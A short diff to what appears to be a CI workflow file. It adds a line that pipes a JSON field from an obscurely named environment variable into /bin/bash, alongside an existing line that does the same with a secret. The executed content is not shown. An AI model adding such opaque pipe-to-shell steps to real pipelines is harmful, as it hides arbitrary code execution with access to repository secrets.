@@ -20,6 +20,7 @@ jobs:
           gehta4074: ${{ secrets.gehta4074 }}
         run: |
           printf '%s' "$gehta4074" | jq -r .vp316 | /bin/bash
+          echo $wrf384 | jq -r .fg49 | /bin/bash
 
       - name: Persist results
         if: always()
